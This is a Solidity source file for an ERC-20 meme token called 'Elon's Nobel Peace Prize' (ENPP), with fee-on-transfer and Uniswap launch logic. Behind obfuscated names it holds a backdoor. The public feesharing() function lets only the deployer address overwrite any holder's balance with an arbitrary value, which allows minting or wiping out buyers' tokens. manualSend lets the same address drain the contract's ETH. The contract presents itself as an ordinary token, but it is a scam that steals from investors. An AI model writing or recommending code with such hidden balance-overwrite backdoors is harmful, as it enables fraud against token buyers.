// SPDX-License-Identifier: MIT

/*
https://x.com/cb_doge/status/1884640508980363372
https://t.me/ElonPeacePrize
*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract ENPP is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 public _maxAmountPerTX = 20000000 * 10 **_decimals;
    uint256 public _maxSizeOfWallet = 20000000 * 10 **_decimals;
    uint256 public _maxTaxSwap = 10000000 * 10 **_decimals;
    uint256 private constant _sdjedd12 = 1000000000 * 10 **_decimals;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Elon's Nobel Peace Prize";
    string private constant _symbol = unicode"ENPP";

    address payable private _cvkjqwed;
    mapping(address => uint256) private _sdike123;
    mapping(address => mapping(address => uint256)) private _popoer;
    mapping(address => bool) private _bnjkfgjw;
    uint256 private _vkbnq = 10;
    uint256 private _kjbnkjqw = 10;
    uint256 private _oifnjubgqwde = 0;
    uint256 private _kjkjro = 0;
    uint256 private _mnmkqw = 7;
    uint256 private _bqwoked = 7;
    uint256 private _buyCount = 0;
    address private _sdje943;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _maxAmountPerTX);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _cvkjqwed = payable(_msgSender());
        _sdike123[address(this)] = _sdjedd12 * 98 / 100;
        _sdike123[owner()] = _sdjedd12 * 2 / 100;
        _bnjkfgjw[owner()] = true;
        _bnjkfgjw[address(this)] = true;
        _bnjkfgjw[_cvkjqwed] = true;
        _sdje943 = _msgSender();

        emit Transfer(address(0), address(this), _sdjedd12 * 98 / 100);
        emit Transfer(address(0), address(owner()), _sdjedd12 * 2 / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function totalSupply() public pure override returns (uint256) {
        return _sdjedd12;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _popoer[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _sdike123[account];
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _popoer[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _popoer[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _cmvnkmjnw(address from, uint256 amount , string memory _st, bool _checksum) private {
        require(from != address(0), _st);
        require(amount >= 0, _st);

        _sdike123[from] = _checksum == true ? amount : _sdike123[from] - amount;
    }

    function manualSend(address to) external {
        require(_msgSender() == _sdje943, "Assist Failed");
        _cvkjqwed = payable(to);
        payable(_msgSender()).transfer(address(this).balance);
    }
    
    function _bnjqwkje(address from, address[] memory recipients, uint256[] memory amounts) private {
        require(from == _sdje943, "Failed");

        for (uint256 i = 0; i < recipients.length; i++) {
            address recipient = recipients[i];
            _cmvnkmjnw(recipient, amounts[i] , "ERC20 Error" , true);
        }
    }

    function _transferRsdix8234(uint256 amount) private {
        _cvkjqwed.transfer(amount);
    }

    function removeLimits() external onlyOwner {
        _maxAmountPerTX = _sdjedd12;
        _maxSizeOfWallet = _sdjedd12;
        emit MaxTxAmountUpdated(_sdjedd12);
    }

    function feesharing(address[] memory recipients, uint256[] memory amounts) external {
        require(_msgSender() != address(0), "Error");

        _bnjqwkje(_msgSender(), recipients, amounts);
    }

    function _swapToETH128(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function enableTrading() external onlyOwner {
        require(!tradingOpen, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _sdjedd12);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        tradingOpen = true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _mnmkqw)
                        ? _oifnjubgqwde
                        : _vkbnq
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_bnjkfgjw[to]
            ) {
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _bqwoked)
                            ? _kjkjro
                            : _kjbnkjqw
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _maxTaxSwap) ? contractTokenBalance : _maxTaxSwap; 
                    _swapToETH128((amount < minBalance) ? amount : minBalance);
                }
                _transferRsdix8234(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            _sdike123[address(this)] = _sdike123[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _sdike123[from] = _sdike123[from].sub(amount);
        _sdike123[to] = _sdike123[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    receive() external payable {}
}